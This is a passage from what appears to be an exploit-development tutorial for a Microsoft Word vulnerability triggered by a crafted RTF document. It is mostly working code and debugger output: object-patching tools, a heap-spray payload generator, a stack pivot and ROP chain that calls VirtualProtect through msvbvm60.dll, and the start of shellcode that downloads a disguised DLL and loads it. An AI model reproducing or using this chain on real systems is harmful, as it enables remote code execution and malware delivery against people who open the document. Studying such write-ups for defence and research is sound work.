    withv = dword_to_crap(int(withb, 16))

    #print ' -> %s' % crap_to_dword(whatb.decode("hex")).encode("hex")
    print 'Replacing raw utf8 "%s" with %s -> %s' % (whatb, withb, withv)

    f = open(fpath, "rb")
    b = f.read()
    f.close()

    c = b.replace(whatb.decode("hex"), withv.decode("hex"))

    f = open(fdest, "wb")
    f.write(c)
    f.close()

$ python2 replace_offset.py e8a3ace0a288 0x0f8f4820 000538E9.doc/word/document.xml document.xml
Replacing raw utf8 "e8a3ace0a288" with 0x0f8f4820 -> e4a0a0e0be8f
$ mv document.xml 000538E9.doc/word/document.xml
```
### Creating the ZIPs/DOCX

```
$ cd 00039807.doc
$ zip -D -q -9 -r spray.doc .
$ cd ../000538E9.doc
$ zip -D -q -9 -r trigger.doc .
```
### Creating the CDFs

We need a library which allows us to modify the contents of this kind of file. We have Python‚Äôs olefile, but writing is not fully implemented.

Finally, we decded tu use openmcdf, a C# library. Then we only have to write a simple utility:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using OpenMcdf;

namespace cdfreplace
{
    class Program
    {
        static void Main(string[] args)
        {
            string sourcefile = args[0];
            string targetstream = args[1];
            string replfile = args[2];
            string outfile = args[3];

            byte[] replbytes = System.IO.File.ReadAllBytes(replfile);

            System.IO.File.Copy(sourcefile, outfile);

            OpenMcdf.CompoundFile cf = new OpenMcdf.CompoundFile(
                outfile,
                OpenMcdf.CFSUpdateMode.Update,
                OpenMcdf.CFSConfiguration.Default | OpenMcdf.CFSConfiguration.EraseFreeSectors | OpenMcdf.CFSConfiguration.SectorRecycle
               );
            OpenMcdf.CFStream st = cf.RootStorage.GetStream(targetstream);
            st.SetData(replbytes);
            cf.Commit();
        }
    }
}
```

We rename the original CDF files we extracted at the beginning:

‚Äì cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5\_object\_00039807.doc -> original\_spray.cdf

‚Äì cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5\_object\_000538E9.doc -> original\_trigger.cdf

After installing OpenMcdf, we compile our utility. We execute these commands:

```
$ mono cdfreplace.exe original_spray.cdf Package 00039807.doc/spray.doc spray.cdf
$ mono cdfreplace.exe original_trigger.cdf Package 000538E9.doc/trigger.doc trigger.doc
```

Now we are ready to modify the original RTF file.

### Modifying the RTF file

We use our simple tool to replace objects 1 and 2 with the objects we generated in the previous step.

```
$ python2 rtf.py --input original.rtf --output tmp.rtf --replace 1 --withfile spray.cdf
$ python2 rtf.py --input tmp.rtf --output final.rtf --replace 2 --withfile trigger.cdf
```
### PoK (Proof of Kaboom)

After copying test.rtf to our isolated VM, we launch a new WinDbg session:

```
(de8.944): Unknown exception - code e0000002 (first chance)
(de8.944): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Microsoft OfficeOffice15wwlib.dll -
eax=0f8f4820 ebx=00000000 ecx=41424344 edx=00000004 esi=0a8b3f20 edi=0aa27604
eip=702882a6 esp=003349b8 ebp=00334a28 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
wwlib!DllGetLCID+0x2e1e1c:
702882a6 ff5104          call    dword ptr [ecx+4]    ds:002b:41424348=????????

0:000> ub;u
wwlib!DllGetLCID+0x2e1e05:
7028828f 85c9            test    ecx,ecx
70288291 0f84c768e9ff    je      wwlib!DllGetLCID+0x1786d4 (7011eb5e)
70288297 8b4744          mov     eax,dword ptr [edi+44h]
7028829a 894844          mov     dword ptr [eax+44h],ecx
7028829d 8b4744          mov     eax,dword ptr [edi+44h]
702882a0 8b4044          mov     eax,dword ptr [eax+44h]
702882a3 8b08            mov     ecx,dword ptr [eax]
702882a5 50              push    eax
wwlib!DllGetLCID+0x2e1e1c:
702882a6 ff5104          call    dword ptr [ecx+4]
702882a9 e9b068e9ff      jmp     wwlib!DllGetLCID+0x1786d4 (7011eb5e)
702882ae 83f802          cmp     eax,2
702882b1 750f            jne     wwlib!DllGetLCID+0x2e1e38 (702882c2)
702882b3 8d4624          lea     eax,[esi+24h]
702882b6 50              push    eax
702882b7 52              push    edx
702882b8 e893171c00      call    wwlib!DllGetLCID+0x4a35c6 (70449a50)
```

EAX = 0x0f8f4820 and ECX = 0x41424344. It has crashed in a call instruction, which will redirect the execution flow to whatever address we put in the address 0x0f8f4820+4. The only thing left is creating a useful payload.

## 0x05 ‚Äì Creating our payload

Lets remember the layout we need in order to control EIP:

```
Address      Value
X            X
X + 4        Target EIP
```

So, if we use 0x0f8f4820, we have to put at the beginning of the payload the following:

```
[
    0x0f8f4820,
    EIP
]
```

To achieve:

```
Address      Value
0x0f8f4820   0x0f8f4820
0x0f8f4824   Target EIP
```

How can we turn this into controlled code execution? We have a call to a controlled address. DEP is enabled, so we cannot simply jump to an address in the heap we control.

We have to use ROP, so we need ESP to point to an address in which we can put the address of our gadgets. This is, once again, the heap we are spraying, so we must perform a stack pivot.

Our goal, then, is to set EIP to a sequence of instructions which will make ESP point to somewhere in the heap we can control, possibly just after the two addresses we have used up to this point.

As we saw at the beginning of this post, the only module which is not ASLR enabled is msvbvm60.dll. Lets get the available gadgets:

```
$ sha256sum libs/msvbvm60.dll
2246b4feae199408ea66d4a90c1589026f4a5800ce5a28e583b94506a8a73dce  libs/msvbvm60.dll
$ ROPgadget --binary libs/msvbvm60.dll > gadgets.txt
```

Our environment is the following:

* EAX = payload‚Äôs address
* ECX = payload‚Äôs address
* Top of the stack: payload‚Äôs address (once the call instruction is executed, it will be the return address)

We want:

* ESP = payload‚Äôs address + some delta to bypass the first two addresses and leaves us enough space to work comfortably
* To keep a copy of the original ESP just in case we want to restore Word to a sane execution and thus not crash.

Lets see which gadgets allow us to control ESP. We want to avoid those which perform calls or jumps (they may be useful, but after a quick glance there didn‚Äôt seem to be any which would allow us to keep going in a simple way).

```
$ cat gadgets.txt| grep -v call | grep -v jmp | grep -v jb | grep esp | grep xchg
[...]
0x7297d562 : je 0x7297d590 ; adc al, ch ; pop ecx ; xchg eax, esp ; add al, byte ptr [eax] ; ret 8
[...]
```

There are several gadgets matching our conditions, but we chose that one. It starts with a jump, but we can skip it anyway:

```
$ r2 libs/msvbvm60.dll
[0x72941af8]> s 0x7297d562
[0x7297d562]> pd
        ,=< 0x7297d562      7424           je 0x7297d588
        |   0x7297d564      10e8           adc al, ch
        |   0x7297d566      59             pop ecx
        |   0x7297d567      94             xchg eax, esp
        |   0x7297d568      0200           add al, byte [eax]
        |   0x7297d56a      c20800         ret 8
```

This is what will happen when EIP reaches 0x7297d564:

* EAX = 0x0f8f4820
* ECX = 0x0f8f4820
* EAX = EAX + ECX‚Äôs 2nd less weighted byte => EAX = EAX + 0x48 => EAX = 0x0f8f4868
* ECX = return address pushed by the call instruction
* ESP = payload‚Äôs address + 0x48 => ESP = 0x0f8f4868
* EAX = old stack address
* EAX = old stack address + [0-0xff]
* ESP = address of the first gadget in our ROP chain
* EIP = address written in the offset 0x48 of our payload (0x0f8f4868 ‚Äì 0x0f8f4820)

We have to take care of the ‚Äúret 8‚Äù in the end of the stack pivot, so we will insert 8 bytes of padding between the first and second gadgets.

From now on we are able to execute ROP gadgets. Lets do a quick check, forcing Word to jump to the classic 0x41414141:

```
import struct
import sys

p = lambda x: struct.pack("<L", x) heap = 0x0f8f4820 pivot = 0x7297d564 padsize = (heap >> 8) & 0xFF

rop = [
  p(heap),
  p(pivot),

  "a" * (padsize - 8),

  p(0x41414141)
]

payload = bytearray("".join(rop))
payload_size = len(payload)

if __name__ == '__main__':
  in_filepath = sys.argv[1]
  out_filepath = sys.argv[2]

  f = open(in_filepath, "rb")
  original = bytearray(f.read())
  f.close()

  begin = 0x800
  offset = 0x1000

  p = begin
  while p < len(original) - payload_size:
    for x in range(payload_size):
      original[p + x] = payload[x]

    p += offset

  f = open(out_filepath, "wb")
  f.write(original)
  f.close()
```

In WinDbg, we set a breakpoint in our stack pivot:

```
(2dc.158): Break instruction exception - code 80000003 (first chance)
eax=7ef88000 ebx=00000000 ecx=00000000 edx=77b3f142 esi=00000000 edi=00000000
eip=77ab000c esp=0da1f8d4 ebp=0da1f900 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!DbgBreakPoint:
77ab000c cc              int     3

0:016> bu 0x7297d564

0:016> g
(2dc.a70): Unknown exception - code e0000002 (first chance)
Breakpoint 0 hit
eax=0f8f4820 ebx=00000000 ecx=0f8f4820 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=7297d564 esp=00494cb4 ebp=00494d28 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef24:
7297d564 10e8            adc     al,ch

0:000> p
eax=0f8f4868 ebx=00000000 ecx=0f8f4820 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=7297d566 esp=00494cb4 ebp=00494d28 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef26:
7297d566 59              pop     ecx

0:000> p
eax=0f8f4868 ebx=00000000 ecx=6ec182a9 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=7297d567 esp=00494cb8 ebp=00494d28 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef27:
7297d567 94              xchg    eax,esp

0:000> p
eax=00494cb8 ebx=00000000 ecx=6ec182a9 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=7297d568 esp=0f8f4868 ebp=00494d28 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef28:
7297d568 0200            add     al,byte ptr [eax]          ds:002b:00494cb8=20

0:000> p
eax=00494cd8 ebx=00000000 ecx=6ec182a9 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=7297d56a esp=0f8f4868 ebp=00494d28 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200286
msvbvm60!IID_IVbaHost+0xef2a:
7297d56a c20800          ret     8

0:000> p
eax=00494cd8 ebx=00000000 ecx=6ec182a9 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=41414141 esp=0f8f4874 ebp=00494d28 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200286
41414141 ??              ???
```

Success.

The next step is executing a shellcode. To do so, we have to put it in a controlled memory address (the same heap page we are working in) and call

```
VirtualProtect(address, size, PAGE_EXECUTE_READWRITE, &old_protect);
```

Where:

* address: address of the shellcode
* size: size of the memory zone we want to make executable
* PAGE\_EXECUTE\_READWRITE: we want to assign read+write+execute permissions, which is 0x40 in WinApi language. We‚Äôd like to use PAGE\_EXECUTE\_READ instead, but note that we are using the same memory address both for code and stack, so it must remain writable.
* old\_protect: where to save the old memory protection flags

We need the address of VirtualProtect. We might get it from the PEB, but msvbvm60 makes it easier for us. Lets check its imports:

```
$ r2 ibs/msvbvm60.dll
[0x72941af8]> ii~VirtualProtect
ordinal=053 plt=0x729410d0 bind=NONE type=FUNC name=KERNEL32.dll_VirtualProtect

0:000> dd 0x729410d0
729410d0  759042ff 75904333 7591e8c5 75925935
0:000> u 759042ff
kernel32!VirtualProtectStub:
759042ff 8bff            mov     edi,edi
75904301 55              push    ebp
75904302 8bec            mov     ebp,esp
75904304 5d              pop     ebp
75904305 e9becdffff      jmp     kernel32!VirtualProtect (759010c8)
```

We have a pointer to VirtualProtect stored at msvbvm60‚Äôs 0x729410d0. If we jump here we only have to make sure that we have set up the stack in a way that resembles a proper call:

```
Top of the stack
----
old_protect                   ; push arg_4
PAGE_EXECUTE_READWRITE        ; push arg_3
size                          ; push arg_2
address                       ; push arg_1
siguiente gadget              ; call VirtualProtect
----
Bottom of the stack
```

How do we jump to VirtualProtect? We can look for gadgets containing jumps to registers that we can control:

* Direct to register, such as jmp eax
* Indirect to register, such as jmp [eax]

The second option saves us from having to ROP the dereference, so:

```
$ cat gadgets.txt| grep "jmp dword ptr ["
[...]
0x7295088f : jmp dword ptr [eax]
0x72a3eb27 : jmp dword ptr [ebp - 0x6c]
0x729907a2 : jmp dword ptr [ebx]
0x72a429d8 : jmp dword ptr [ecx - 1]
0x72949a32 : jmp dword ptr [ecx]
0x729eb1db : jmp dword ptr [edi]
0x729eb1e0 : jmp dword ptr [edx]
0x72a21a18 : jmp dword ptr [esi - 0x75]
0x72a00884 : jmp dword ptr [esi - 0x7d]
0x7295cb96 : jmp dword ptr [esi]
0x729eb1ef : jmp dword ptr [esp + esi*2]
[...]
0x729914fb : sti ; jmp dword ptr [ecx]
[...]
```

We have plenty of choice here. What registers are we able to control?

```
$ cat gadgets.txt| egrep ": pop (e[abcd]x|e[sd]i) ; ret"
0x729440cb : pop eax ; ret
0x72992f5e : pop eax ; ret 0x10
0x72a06933 : pop eax ; ret 0x14
0x729c0a9b : pop eax ; ret 0xc
0x72944175 : pop eax ; ret 4
0x7298fa2e : pop eax ; ret 8
0x72941f10 : pop ebx ; ret
0x72991c70 : pop ebx ; ret 0x10
0x72999274 : pop ebx ; ret 0x14
0x72941b4e : pop ebx ; ret 0xc
0x72943255 : pop ebx ; ret 4
0x729459e4 : pop ebx ; ret 8
0x729419f4 : pop ecx ; ret
0x729e1dfc : pop ecx ; ret 0x14
0x72954ecc : pop ecx ; ret 0x7297
0x729e19db : pop ecx ; ret 0xc
0x729ff08b : pop ecx ; ret 0xfff5
0x7294a47b : pop ecx ; ret 4
0x7294464b : pop ecx ; ret 8
0x7294575b : pop edi ; ret
0x729d0fc9 : pop edi ; ret 0x10
0x7294e501 : pop edi ; ret 4
0x7298c1e4 : pop edi ; ret 8
0x729a4421 : pop edx ; ret
0x72941e54 : pop esi ; ret
0x7294a52f : pop esi ; ret 0x10
0x72974c79 : pop esi ; ret 0x14
0x729a32b5 : pop esi ; ret 0x1c
0x729d831e : pop esi ; ret 0x24
0x72945a74 : pop esi ; ret 0xc
0x7294356a : pop esi ; ret 4
0x72945940 : pop esi ; ret 8
```

We will use EAX. However, it would be convenient to save it somewhere, as at this point it contains the only copy of the original value of ESP. This, however, is left as an exercise.

We have to choose a static address to use as the 4th argument of VirtualProtect. Let‚Äôs see where the data section is located:

```
[0x7297d562]> iS
[Sections]
idx=00 vaddr=0x72941000 paddr=0x00001000 sz=1032192 vsz=1032192 perm=m-r-x name=.text
idx=01 vaddr=0x72a3d000 paddr=0x000fd000 sz=53248 vsz=53248 perm=m-r-x name=ENGINE
idx=02 vaddr=0x72a4a000 paddr=0x0010a000 sz=28672 vsz=32768 perm=m-rw- name=.data
idx=03 vaddr=0x72a52000 paddr=0x00111000 sz=200704 vsz=200704 perm=m-r-- name=.rsrc
idx=04 vaddr=0x72a83000 paddr=0x00142000 sz=65536 vsz=65536 perm=m-r-- name=.reloc

0:000> dd 0x72a4a000 0x72a4a000+28672
[...]
72a4d290  00000000 00000000 00000000 00000000
72a4d2a0  00000000 00000000 00000000 00000000
72a4d2b0  00000000 00000000 00000000 00000000
72a4d2c0  00000000 00000000 00000000 00000000
72a4d2d0  00000000 00000000 00000000 00000000
72a4d2e0  00000000 00000000 00000000 00000000
72a4d2f0  00000000 00000000 00000000 00000000
72a4d300  00000000 00000000 00000000 00000000
72a4d310  00000000 00000000 00000000 00000000
72a4d320  00000000 00000000 00000000 00000000
72a4d330  00000000 00000000 00000000 00000000
72a4d340  00000000 00000000 00000000 00000000
72a4d350  00000000 00000000 00000000 00000000
72a4d360  00000000 00000000 00000000 00000000
72a4d370  00000000 00000000 00000000 00000000
72a4d380  00000000 00000000 00000000 00000000
72a4d390  00000000 00000000 00000000 00000000
72a4d3a0  00000000 00000000 00000000 00000000
72a4d3b0  00000000 00000000 00000000 00000000
[...]
```

We are looking for some unused space. For example, 0x72a4d300. We will zero out the dword at that address when we are done.

Our ROP chain would be like this:

```
heap = 0x0f8f4820
pivot = 0x7297d564
pop_eax = 0x729440cb
jmp_ptr_eax = 0x7295088f
ptr_virtualprotect = 0x729410d0

virtualprotect_size = 0x200
virtualprotect_prot = 0x40
virtualprotect_oldprot = 0x72a4d300
shellcode_address = heap + (padsize - 8) + 48

shellcode = "xcc"

rop = [
  p(heap),                  # @0
  p(pivot),                 # @4

  "a" * (padsize - 8),      # @8

  p(pop_eax),               # @ 8 + padsize
  "a" * 8,                  # @ 12 + padsize ; compensamos ret 8
  p(ptr_virtualprotect),   # @ 20 + padsize
  p(jmp_ptr_eax),           # @ 24 + padsize

  p(shellcode_address),     # @ 28 + padsize ; retorno de VirtualProtect
  p(shellcode_address),     # @ 32 + padsize ; address
  p(virtualprotect_size),   # @ 36 + padsize ; size
  p(virtualprotect_prot),   # @ 40 + padsize ; new prot
  p(virtualprotect_oldprot),# @ 44 + padsize ; & old prot

  shellcode                 # @ 48 + padsize
]
```

If everything went OK, after creating the RTF file and opening it with Word, WinDbg should catch the ‚Äúint 3‚Äù we put as a shellcode.

```
0:015> bu 0x7297d564
(ecc.3d4): Unknown exception - code e0000002 (first chance)
Breakpoint 0 hit
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Microsoft OfficeOffice15wwlib.dll -
eax=0f8f4820 ebx=00000000 ecx=0f8f4820 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7297d564 esp=00644bd4 ebp=00644c48 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef24:
7297d564 10e8            adc     al,ch

0:000> p
eax=0f8f4868 ebx=00000000 ecx=0f8f4820 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7297d566 esp=00644bd4 ebp=00644c48 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef26:
7297d566 59              pop     ecx

0:000>
eax=0f8f4868 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7297d567 esp=00644bd8 ebp=00644c48 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef27:
7297d567 94              xchg    eax,esp

0:000>
eax=00644bd8 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7297d568 esp=0f8f4868 ebp=00644c48 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef28:
7297d568 0200            add     al,byte ptr [eax]          ds:002b:00644bd8=20

0:000>
eax=00644bf8 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7297d56a esp=0f8f4868 ebp=00644c48 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
msvbvm60!IID_IVbaHost+0xef2a:
7297d56a c20800          ret     8

0:000>
eax=00644bf8 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=729440cb esp=0f8f4874 ebp=00644c48 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
msvbvm60!ThunRTMain+0xb27:
729440cb 58              pop     eax

0:000>
eax=729410d0 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=729440cc esp=0f8f4878 ebp=00644c48 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
msvbvm60!ThunRTMain+0xb28:
729440cc c3              ret

0:000>
eax=729410d0 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7295088f esp=0f8f487c ebp=00644c48 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
msvbvm60!Zombie_Release+0x1e36:
7295088f ff20            jmp     dword ptr [eax]      ds:002b:729410d0={kernel32!VirtualProtectStub (75e342ff)}

0:000> dd esp
0f8f487c  0f8f4890 0f8f4890 00000200 00000040
0f8f488c  72a4d300 729440cc 088883ec 729440cb
0f8f489c  088883ec 729440cb 088883ec 729440cb
0f8f48ac  088883ec 729440cb 088883ec 729440cb
0f8f48bc  088883ec 729440cb 088883ec 729440cb
0f8f48cc  088883ec 729440cb 088883ec 729440cb
0f8f48dc  088883ec 729440cb 088883ec 729440cb
0f8f48ec  088883ec 729440cb 088883ec 729440cb

0:000> u 0f8f4890
0f8f4890 cc              int     3
0f8f4891 40              inc     eax
0f8f4892 94              xchg    eax,esp
0f8f4893 72ec            jb      0f8f4881
0f8f4895 838808cb409472  or      dword ptr [eax-6BBF34F8h],72h
0f8f489c ec              in      al,dx
0f8f489d 838808cb409472  or      dword ptr [eax-6BBF34F8h],72h
0f8f48a4 ec              in      al,dx

0:000> g
(ecc.3d4): Break instruction exception - code 80000003 (first chance)
eax=00000001 ebx=00000000 ecx=f1290000 edx=003fe188 esi=0a45f4d0 edi=0a47cde4
eip=0f8f4890 esp=0f8f4890 ebp=00644c48 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
0f8f4890 cc              int     3
```

The only task left is writing a shellcode. ASM is beautiful, but it is generally more pleasurable to write C. Our shellcode will perform the following actions:

* Download a DLL from somewhere in the internet
* LoadLibrary() the downloaded file

However, downloading a DLL is not the paradigm of stealth. We are going to implement a very naif disguise: we will prepend the 58 bytes of a BMP file to the downloaded file. The rest of the contents will be xor‚Äôed with a fixed value. In pseudoCode:

```
char url[] = "https://127.0.0.1:8000/asd.bmp";
char download_path[256] = { 0 };
HANDLE hnd, lib;
DWORD filesize, nbytes;
DWORD tmp;
char *dll, *bmp;
int (*pwn)(void);

URLDownloadToCacheFileA(NULL, url, download_path, 255, 0, NULL);

hnd = CreateFileA(
          download_path,
          GENERIC_READ | GENERIC_WRITE,
          FILE_SHARED_READ,
          0,
          OPEN_EXISTING,
          FILE_ATTRIBUTE_NORMAL,
          NULL
      );

filesize = GetFileSize(hnd, NULL);

bmp = VirtualAlloc(NULL, filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

ReadFile(hnd, bmp, filesize, &nbytes, NULL);

dll = bmp + 58;
for(unsigned int i = 0; i < filesize; i += 4) {
  tmp = * ((DWORD *) &dll[i]);
  tmp ^= 0x1337c0de
}

SetFilePointer(hnd, 0, 0, FILE_BEGIN);
WriteFile(hnd, dll, filesize - 58, &nbytes, NULL);
SetEndOfFile(hnd);
CloseHandle(hnd);

lib = LoadLibraryA(download_path);
pwn = GetProcAddress(lib, "doit");
pwn();
```

We will use NASM to write the shellcode. First of all, we need a simple way to call into the WinApi. This problem was solved time ago and there are known public implementations. We are going to use [Metasploit‚Äôs one](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm).

Our shellcode starts by defining all the constants we will need. Write in pwn.asm:

```
BITS 32
ORG 0

MEM_COMMIT: equ 0x00001000
MEM_RESERVE: equ 0x00002000

PAGE_EXECUTE: equ 0x10
PAGE_EXECUTE_READ: equ 0x20
PAGE_EXECUTE_READWRITE: equ 0x40
PAGE_READWRITE: equ 0x04

GENERIC_READ: equ 0x80000000
GENERIC_WRITE: equ 0x40000000
FILE_SHARE_READ: equ 0x01
OPEN_EXISTING: equ 0x03
FILE_ATTRIBUTE_NORMAL: equ 0x80
FILE_BEGIN: equ 0x00
```

Metasploit‚Äôs shellcode is easy to use. When we call a function from the WinApi we usually do the following:

```
push arg_N
push arg_N-1
...
push arg_1
push arg_0
call winapi
```

When using MSF‚Äôs shellcode, an additional argument is pushed: a simple hash of the library and function‚Äôs name. The shellcode will traverse the list of modules loaded in the process, and then each module‚Äôs exports. At each interation it will compare the calculated hash with the one pushed by us, until there is a match. So:

```
push arg_N
push arg_N-1
...
push arg_1
push arg_0
push HASH
call msf_api
```

Lets define all the hashes we will use. The code we used is based on the one [here](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/hash.py).

```
import sys

def ror( dword, bits ):
  return ( dword >> bits | dword << ( 32 - bits ) ) & 0xFFFFFFFF
#=============================================================================#
def unicode( string, uppercase=True ):
  result = "";
  if uppercase:
    string = string.upper()
  for c in string:
    result += c + "x00"
  return result
#=============================================================================#
def hash( module, function, bits=13, print_hash=True ):
  module_hash = 0
  function_hash = 0
  for c in unicode( module + "x00" ):
    module_hash  = ror( module_hash, bits )
    module_hash += ord( c )
  for c in str( function + "x00" ):
    function_hash  = ror( function_hash, bits )
    function_hash += ord( c )
  h = module_hash + function_hash & 0xFFFFFFFF
  if print_hash:
    print "[+] 0x%08X = %s!%s" % ( h, module.lower(), function )
  return h

if __name__ == '__main__':
        for x in sys.argv[1:]:
                module, function = x.split(":", 2)
                print module, function, hex(hash(module, function, print_hash=False))
```

We add the definitions to pwn.asm:

```
VIRTUALALLOC_HASH: equ 0xe553a458
VIRTUALPROTECT_HASH: equ 0xc38ae11
URLDOWNLOADTOCACHEFILE_HASH equ 0xdac0c98f
GETFILESIZE_HASH: equ 0x701e12c6
CREATEFILE_HASH: equ 0x4fdaf6da
READFILE_HASH: equ 0xbb5f9ead
WRITEFILE_HASH: equ 0x5bae572d
SETFILEPOINTER_HASH: equ 0xd812cdaa
SETENDOFFILE_HASH: equ 0xd7e3cbdb
CLOSEHANDLE_HASH: equ 0x528796c6
LOADLIBRARY_HASH: equ 0x726774c
GETPROCADDRESS_HASH: equ 0x7802f749
DELETEFILE_HASH: equ 0x13dd2ed7
EXITPROCESS_HASH: equ 0x56a2b5f0
```

And define a structure in which we will store our variables:

```
STRUC mydata
    .api_call:      resd 1      ; address of MSF's api
    .filehandle:    resd 1      ; HANDLE given by CreateFileA
    .filebuf:       resd 1      ; address returned by VirtualAlloc
    .filesize:      resd 1      ; size returned by GetFileSize
    .nbytes:        resd 1      ; used by ReadFile and WriteFile
    .url:           resb 256    ; URL we will download the BMP from
    .down_filename: resb 256    ; URLDownloadToCacheFileA will write here the path where it saved the file
    .apiname:       resb 64     ; the string "doit" passed to GetProcAddress
ENDSTRUC
```

And then we write the code:

```
cld
call start

%include "block_api.asm" ;

start:
    pop ebp     ; ebp -> api MSF

    ; we alloc some space for mydata
    push dword PAGE_READWRITE
    push dword (MEM_COMMIT | MEM_RESERVE)
    push mydata_size
    push 0
    push VIRTUALALLOC_HASH
    call ebp

    ; save MSF's api address and use ebp as a pointer to mydata
    mov dword [eax + mydata.api_call], ebp
    mov ebp, eax

    ; url = "https://127.0.0.1:8000/asd.bmp"
    mov dword [ebp + mydata.url], 0x70747468
    mov dword [ebp + mydata.url + 4], 0x312f2f3a
    mov dword [ebp + mydata.url + 8], 0x302e3732
    mov dword [ebp + mydata.url + 12], 0x312e302e
    mov dword [ebp + mydata.url + 16], 0x3030383a
    mov dword [ebp + mydata.url + 20], 0x73612f30
    mov dword [ebp + mydata.url + 24], 0x6d622e64
    mov dword [ebp + mydata.url + 28], 0x00000070

    ; apiname = "doit"
    mov dword [ebp + mydata.apiname], 0x74696f64
    mov dword [ebp + mydata.apiname + 4], 0x00000000

    ; UrlDownloadToCacheFileA(mydata.url, mydata.url_filename, 254, 0, NULL);
    push 0                              ; pBSC
    push 0                              ; dwReserved
    push 254                            ; cchFileName
    lea eax, [ebp + mydata.down_filename]
    push eax                            ; szFileName
    lea eax, [ebp + mydata.url]
    push eax                            ; szUrl
    push 0                              ; lpUnkCaller
    push URLDOWNLOADTOCACHEFILE_HASH
    call dword [ebp + mydata.api_call]

    ; mydata.filehandle = CreateFileA(
    ;                       mydata.url_filename,
    ;                       GENERIC_READ | GENERIC_WRITE,
    ;                       FILE_SHARED_READ,
    ;                       0,
    ;                       OPEN_EXISTING,
    ;                       FILE_ATTRIBUTE_NORMAL,
    ;                       NULL
    ; )
    push dword 0                        ; hTemplateFile
    push dword FILE_ATTRIBUTE_NORMAL    ; dwFlagsAndAttributes
    push dword OPEN_EXISTING            ; dwCreationDisposition
    push dword 0                        ; lpSecurityAttributes
    push dword FILE_SHARE_READ          ; dwShareMode
    push dword (GENERIC_READ | GENERIC_WRITE) ; dwDesiredAccess
    lea eax, [ebp + mydata.down_filename]
    push eax
    push CREATEFILE_HASH
    call dword [ebp + mydata.api_call]
    mov dword [ebp + mydata.filehandle], eax

    ; mydata.filesize = GetFileSize(mydata.filehandle, NULL)
    push dword 0                        ; lpFileSizeHigh
    push eax                            ; hFile
    push GETFILESIZE_HASH
    call dword [ebp + mydata.api_call]
    mov dword [ebp + mydata.filesize], eax

    ; mydata.filebuf = VirtualAlloc(
    ;                     NULL,
    ;                     mydata.filesize,
    ;                     MEM_COMMIT | MEM_RESERVE,
    ;                     PAGE_READWRITE
    ;                 );
    push dword PAGE_READWRITE
    push dword (MEM_COMMIT | MEM_RESERVE)
    push eax
    push 0
    push VIRTUALALLOC_HASH
    call dword [ebp + mydata.api_call]
    mov dword [ebp + mydata.filebuf], eax

    ; ReadFile(
    ;         mydata.filehandle,
    ;         mydata.filebuf,
